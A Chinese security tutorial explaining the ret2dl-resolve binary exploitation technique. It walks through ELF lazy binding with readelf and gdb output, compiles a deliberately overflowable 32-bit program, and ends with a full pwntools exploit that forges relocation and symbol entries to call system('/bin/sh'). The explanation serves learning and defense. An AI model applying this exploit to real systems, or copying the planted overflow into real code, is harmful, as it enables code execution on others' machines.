***本文作者：jamzy，本文属FreeBuf 原创奖励计划，未经许可禁止转载。**  

## 前置知识：函数执行流程

 **因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy
binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。**

    
    
    #include <unistd.h>
    #include <string.h>
    void fun(){
        char buffer[0x20];
        read(0,buffer,0x200);
    }
    int main(){
        fun();
        return 0;
    }
    

用如下命令编译

    
    
    gcc fun.c -fno-stack-protector -m32 -o fun
    

首先利用fun这个程序了解一下elf各段之间的关系？

    
    
    kaka@ubuntu:~/c$ readelf -S fun
    共有 31 个节头，从偏移量 0x17ec 开始：
    
    节头：
      [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
      [ 0]                   NULL            00000000 000000 000000 00      0   0  0
      [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
      [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
      [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
      [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
      [ 5] .dynsym   //动态链接符号表        DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
      [ 6] .dynstr     //动态链接的字符串      STRTAB          0804821c 00021c 00004a 00   A  0   0  1
      [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2
      [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4
      [ 9] .rel.dyn //变量重定位        REL             08048290 000290 000008 08   A  5   0  4
      [10] .rel.plt  //函数重定位        REL             08048298 000298 000010 08  AI  5  24  4
      [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4
      [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16
      [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8
      [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16
      [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4
      [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4
      [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4
      [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4
      [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
      [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
      [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
      [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
      [23] .got   //全局变量偏移表           PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
      [24] .got.plt   //全局函数偏移表       PROGBITS        0804a000 001000 000014 04  WA  0   0  4
      [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4
      [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1
      [27] .comment          PROGBITS        00000000 00101c 000034 01  MS  0   0  1
      [28] .shstrtab         STRTAB          00000000 0016df 00010a 00      0   0  1
      [29] .symtab           SYMTAB          00000000 001050 000460 10     30  47  4
      [30] .strtab           STRTAB          00000000 0014b0 00022f 00      0   0  1
    

num[9],num[10]的type为rel类型，表明这两部分为重定位表项。

而且我们需要知道`.got.plt`前三项的特殊用途

>   * address of .dynamic
>   * link_map
>   * dl_runtime_resolve
>

然后重点关注一下我们所需要的section

    
    
    kaka@ubuntu:~/c$ readelf -d fun
    
    Dynamic section at offset 0xf14 contains 24 entries:
      标记        类型                         名称/值
     0x00000001 (NEEDED)                     共享库：[libc.so.6]
     0x0000000c (INIT)                       0x80482a8
     0x0000000d (FINI)                       0x80484b4
     0x00000019 (INIT_ARRAY)                 0x8049f08
     0x0000001b (INIT_ARRAYSZ)               4 (bytes)
     0x0000001a (FINI_ARRAY)                 0x8049f0c
     0x0000001c (FINI_ARRAYSZ)               4 (bytes)
     0x6ffffef5 (GNU_HASH)                   0x80481ac
     0x00000005 (STRTAB)                     0x804821c
     0x00000006 (SYMTAB)                     0x80481cc
     0x0000000a (STRSZ)                      74 (bytes)
     0x0000000b (SYMENT)                     16 (bytes)
     0x00000015 (DEBUG)                      0x0
     0x00000003 (PLTGOT)                     0x804a000
     0x00000002 (PLTRELSZ)                   16 (bytes)
     0x00000014 (PLTREL)                     REL
     0x00000017 (JMPREL)                     0x8048298
     0x00000011 (REL)                        0x8048290
     0x00000012 (RELSZ)                      8 (bytes)
     0x00000013 (RELENT)                     8 (bytes)
     0x6ffffffe (VERNEED)                    0x8048270
     0x6fffffff (VERNEEDNUM)                 1
     0x6ffffff0 (VERSYM)                     0x8048266
     0x00000000 (NULL)                       0x0
    

它的结构如下：

    
    
    typedef struct {
        Elf32_Sword d_tag;
        union {
            Elf32_Word d_val;
            Elf32_Addr d_ptr;
        } d_un;
    } Elf32_Dyn;
    

一个 Elf_Dyn 是一个键值对，其中 d_tag 是键，d_value
是值。可以看到.dynamic中的`JMPREL`段地址与`.rel.plt`地址相对应，是用来保存运行时重定位表的，看一下该表的内容

    
    
    kaka@ubuntu:~/c$ readelf -r fun
    
    重定位节 '.rel.dyn' 位于偏移量 0x290 含有 1 个条目：
     偏移量     信息    类型              符号值      符号名称
    08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__
    
    重定位节 '.rel.plt' 位于偏移量 0x298 含有 2 个条目：
     偏移量     信息    类型              符号值      符号名称
    0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
    0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
    

可以看到`read`符号位于.rel.plt的第一个，也就是偏移为0x0的地方，这里的`r_offset`（偏移量）就是.got.plt的地址

然后关注一下`.dynsym`(对应SYMTAB )对应的内容

    
    
    kaka@ubuntu:~/c$ readelf -s fun
    
    Symbol table '.dynsym' contains 5 entries:
       Num:    Value  Size Type    Bind   Vis      Ndx Name
         0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
         1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
         2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
         3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
         4: 080484cc     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    
    Symbol table '.symtab' contains 70 entries:
       Num:    Value  Size Type    Bind   Vis      Ndx Name
    

.symtab的内容不用关注，.dynsym的结构体为

    
    
    typedef struct
    {
        Elf32_Word st_name;     // Symbol name(对应于.dynstr中的索引)
        Elf32_Addr st_value;    // Symbol value
        Elf32_Word st_size;     // Symbol size
        unsigned char st_info;  // Symbol type and binding
        unsigned char st_other; // Symbol visibility under glibc>=2.2
        Elf32_Section st_shndx; // Section index
    } Elf32_Sym;
    #define ELF32_R_SYM(info) ((info)>>8)
    #define ELF32_R_TYPE(info) ((unsigned char)(info))
    #define ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))
    

通过ELF32_R_SYM(info) ((info)>>8)
可以得知，sym[num]中的num是通过（(r_info)>>8）索引的（r_info?==>.rel.plt中的info的值）

因为.dynsym的地址为080481cc，又因为read函数对应的num为1，查看一下ndx name为read处的内存

    
    
    gef➤  x/4wx 0x080481cc+0x10*1
    0x80481dc:    0x0000001a    0x00000000    0x00000000    0x00000012
    

解释一下这一串地址`0x080481cc+0x10*1`的意义

>   * 0x080481cc 对应.dynsym的地址
>   * 0x10 ： 每一条symbol信息的大小在SYMENT中体现，为16 bytes （可以用readelf -d fun命令查看）
>   * 1 ： num值为1
>

可以看到0x080481dc对应的第一个值为0x1a，这个值对应st_name 即read字符串在.dynstr中的偏移

再利用如下命令即可找到read符号

    
    
    gef➤  x/s 0x0804821c+0x1a
    0x8048236:    "read"
    

0x0804821c+0x1a 解析

>   * 0x0804821c 对应于.dynstr的地址
>   * 0x1a 对应刚才得到的偏移
>

## 函数执行流程分析

用gdb运行这个程序，并在read函数处下断点

    
    
    gef➤  p read 
    $1 = {<text variable, no debug info>} 0x80482e0 <read@plt>
    gef➤  b *0x80482e0
    Breakpoint 1 at 0x80482e0
    gef➤  r
    
    
    
    0x80482e0 <read@plt+0>     jmp    DWORD PTR ds:0x804a00c
    0x80482e6 <read@plt+6>     push   0x0
    0x80482eb <read@plt+11>    jmp    0x80482d0
    

执行到我们下的断点处发现，会跳转到`0x804a00c`这个地址,由于在ida中我们找不到这一地址，继续用gdb查看

    
    
    gef➤  x/wx 0x804a00c
    0x804a00c:    0x080482e6
    

0x0804a00c这个地址处存储的内容为[read@plt+6](mailto:read@plt+6)的地址，因为这个程序第一次运行所以got表中没有保存read函数的地址，所以程序又跳转会[read@plt+6](mailto:read@plt+6)，所以紧接着会执行

    
    
    0x80482e6 <read@plt+6>     push   0x0
    0x80482eb <read@plt+11>    jmp    0x80482d0
    

先将0x0压栈（0x0
表示相对.rel.plt的偏移，通过上面分析我们可以知道，read符号在.rel.plt中的位置为第一个，所以偏移为0），又跳转到0x80482d0，看一下该地处的内容

    
    
    gef➤  x/2i 0x080482d0
       0x80482d0:    push   DWORD PTR ds:0x804a004
       0x80482d6:    jmp    DWORD PTR ds:0x804a008
    

会将0x804a004压栈，然后跳转到0x804a008处。

  * 0x804a004处对应一个指向内部数据结构的指针，类型是 link_map，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的 l_info 域中保存了 .dynamic 段中大多数条目的指针构成的一个数组，我们后面会利用它。
  * 0x0804a008 处为函数 dl_runtime_resolve(link_map,rel_offset)

此时的栈布局为

    
    
    0xffffcfe8│+0x00: 0x00000000     ← $esp
    0xffffcfec│+0x04: 0x08048424  →  <fun+25> add esp, 0x10
    

所以会调用函数dl_runtime_resolve(link_map,0x0),解析出地址，然后写到对应位置因此如果我们伪造一个rel_offset,以及对应的其他结构体，便可以执行任意函数了

其实dl_runtime_resolve()函数中调用了dl_fixup()函数

首先我们看一下dl_runtime_resolve()函数的实现

    
    
    gef➤  x/4x 0x80481cc+16
    0x80481dc:    0x0000001a    0x00000000    0x00000000    0x00000012
    gef➤  x/wx 0x0804a008
    0x804a008:    0xf7fee000
    gef➤  x/20i 0xf7fee000
       0xf7fee000 <_dl_runtime_resolve>:    push   eax
       0xf7fee001 <_dl_runtime_resolve+1>:    push   ecx
       0xf7fee002 <_dl_runtime_resolve+2>:    push   edx
       0xf7fee003 <_dl_runtime_resolve+3>:    mov    edx,DWORD PTR [esp+0x10]
       0xf7fee007 <_dl_runtime_resolve+7>:    mov    eax,DWORD PTR [esp+0xc]
       0xf7fee00b <_dl_runtime_resolve+11>:    call   0xf7fe77e0 <_dl_fixup>
       0xf7fee010 <_dl_runtime_resolve+16>:    pop    edx
       0xf7fee011 <_dl_runtime_resolve+17>:    mov    ecx,DWORD PTR [esp]
       0xf7fee014 <_dl_runtime_resolve+20>:    mov    DWORD PTR [esp],eax
       0xf7fee017 <_dl_runtime_resolve+23>:    mov    eax,DWORD PTR [esp+0x4]
       0xf7fee01b <_dl_runtime_resolve+27>:    ret    0xc
       0xf7fee01e:    xchg   ax,ax
       0xf7fee020 <_dl_runtime_profile>:    push   esp
       0xf7fee021 <_dl_runtime_profile+1>:    add    DWORD PTR [esp],0x8
       0xf7fee025 <_dl_runtime_profile+5>:    push   ebp
       0xf7fee026 <_dl_runtime_profile+6>:    push   eax
       0xf7fee027 <_dl_runtime_profile+7>:    push   ecx
       0xf7fee028 <_dl_runtime_profile+8>:    push   edx
       0xf7fee029 <_dl_runtime_profile+9>:    mov    ecx,esp
       0xf7fee02b <_dl_runtime_profile+11>:    sub    esp,0x8
    

在 0xf7fee00b地址处调用了 _dl_fixup()函数，并且采用寄存器传参

dl_fixup()是在dl-runtime.c中实现的，这里只展示主要的地方

    
    
    _dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
    ｛
        const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
        const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
        assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
        result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);
        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
        return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
    ｝
    

逐行解释

    
    
    _dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
    

这里面
link_map还是一开始传进来的link_map,但一开始传进来的rel_offset改为用reloc_arg表示：`reloc_arg=reloffset`

    
    
        const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    

用来计算重定位入口reloc，JMPREL即.rel.plt地址，reloc_offset即reloc_arg

    
    
        const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    

找到在.dynsym中对应的条目，[ELFW(R_SYM) (reloc->r_info)]就是为了找到对应的num[?]

    
    
        assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
    

检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7

    
    
     result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);
    

根据st_name对应的偏移，去.dynstr(STRTAB)中查找对应的字符串，result为libc基地址(不知道是怎么找到result的，反正知道就好了。。。)

    
    
    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    

value为函数的实际地址，在libc基地址的基础上加上函数在libc中的偏移

    
    
        return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
    

将函数地址写到got表对应位置

## 攻击流程

流程如下当.dynamic可写时，可以将.dynstr地址改写为.bss地址，然后在bss段伪造我们想要的函数的字符串

当.dynamic不可写时， 上面我们讲完了函数的解析流程
主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容->st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。

### 伪造结构

  * 伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址）从bss+0x100地址处开始伪造`Elf32_Rel`即.rel.plt的结构,因此这一部分相对于.rel.plt的偏移为
    
        rel_offset=bss_address+0x100+junk-.rel.plt_address
    

  * 伪造`Elf32_Rel`即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0x100-.dynsym)/0x10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值
    
        r_info=(index << 8 ) | 0x7
    

  * 伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处
    
        gef➤  x/4wx 0x80481cc+16
    0x80481dc:    0x0000001a    0x00000000    0x00000000    0x00000012
    

st_name由0x1a改为我们得到的值，其余部分按照上面继续使用

  * 伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system

dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数

## 编写exp

    
    
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    p=process('./fun')
    
    pop_ebp_ret=0x080484ab
    leave_ret=0x08048378
    pppr=0x080484a9
    
    fake_stack_size=0x800
    bss=0x0804a01c
    read_plt=0x080482e0
    read_got=0x0804a00c
    bss_stage=bss+fake_stack_size
    dynsym=0x080481cc
    dynstr=0x0804821c
    plt=0x080482d0
    relplt=0x08048298
    rel_offset=bss_stage+28-relplt
    fake_sym_addr=bss_stage+36
    align=0x10-((fake_sym_addr-dynsym)&0xf) #为了16字节对齐
    print 'align==>'+hex(align)
    fake_sym_addr=fake_sym_addr+align
    index=(fake_sym_addr-dynsym)/0x10
    print 'index==>'+hex(index)
    r_info=(index<<8)|0x7
    print 'r_info==>'+hex(r_info)
    fake_raloc=p32(read_got)+p32(r_info)
    st_name=fake_sym_addr-dynstr+16
    fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)
    
    payload='a'*44
    payload+=p32(read_plt)
    payload+=p32(pppr)
    payload+=p32(0)
    payload+=p32(bss_stage)
    payload+=p32(100)
    payload+=p32(pop_ebp_ret)
    payload+=p32(bss_stage)
    payload+=p32(leave_ret)
    p.sendline(payload)
    
    binsh='/bin/sh'
    
    payload='aaaa'
    payload+=p32(plt)
    payload+=p32(rel_offset)
    payload+='aaaa'
    payload+=p32(bss_stage+80)
    payload+='aaaa'
    payload+='aaaa'
    payload+=fake_raloc
    payload+='a'*align
    payload+=fake_sym
    payload+='system\0'
    payload+='a'*(80-len(payload))
    payload+=binsh+'\x00'
    payload+='a'*(100-len(payload))
    p.send(payload)
    p.interactive()
    

以上代码只是为了理解流程，利用[rouputils](https://github.com/inaz2/roputils)工具可以很快的写exp

相关链接：

>   * <http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-> frederico.pdf>
>   *
> <http://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>
>
>   * <http://bestwing.me/2017/11/14/Return-to-dl-resolve/>
>
>

欢迎初学pwn的朋友一起讨论。

 ***本文作者：jamzy，本文属FreeBuf 原创奖励计划，未经许可禁止转载。**

